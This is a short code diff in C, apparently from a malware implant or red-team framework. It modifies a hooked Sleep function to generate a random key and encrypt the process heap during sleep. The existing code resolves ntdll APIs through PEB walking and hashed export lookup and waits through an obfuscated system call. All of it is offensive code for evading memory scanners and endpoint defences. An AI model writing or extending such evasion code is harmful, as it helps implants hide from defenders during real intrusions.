@@ -39,15 +39,24 @@ D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ ULONG WaitTime )
 	API		Api;
 	LARGE_INTEGER	Del;
 
+	BYTE		Key[ 16 ];
+
 	PVOID*		Arg = NULL;
 
 	/* Zero out stack structures */
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
 	RtlSecureZeroMemory( &Del, sizeof( Del ) );
+	RtlSecureZeroMemory( &Key, sizeof( Key ) );
+
+	/* Random Key Generation */
+	RandomString( &Key, sizeof( Key ) );
 
 	Api.NtWaitForSingleObject = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTWAITFORSINGLEOBJECT );
 	Api.RtlAllocateHeap       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
 	Api.RtlFreeHeap           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
+
+	/* Encrypt the heap */
+	HeapEncryptDecrypt( &Key, sizeof( Key ) );
 
 	/* Allocate a buffer for the arguments */
 	if ( ( Arg = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, 3 * sizeof( PVOID ) ) ) ) {
@@ -56,13 +65,18 @@ D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ ULONG WaitTime )
 		Arg[ 0 ] = C_PTR( NtCurrentProcess() );
 		Arg[ 1 ] = C_PTR( FALSE );
 		Arg[ 2 ] = C_PTR( &Del );
+
 		ObfSystemCall( Api.NtWaitForSingleObject, Arg, 3 );
 
 		/* Free the argument buffer */
 		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Arg );
 	};
 
+	/* Decrypt the heap */
+	HeapEncryptDecrypt( &Key, sizeof( Key ) );
+
 	/* Zero out stack structures */
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
 	RtlSecureZeroMemory( &Del, sizeof( Del ) );
+	RtlSecureZeroMemory( &Key, sizeof( Key ) );
 }
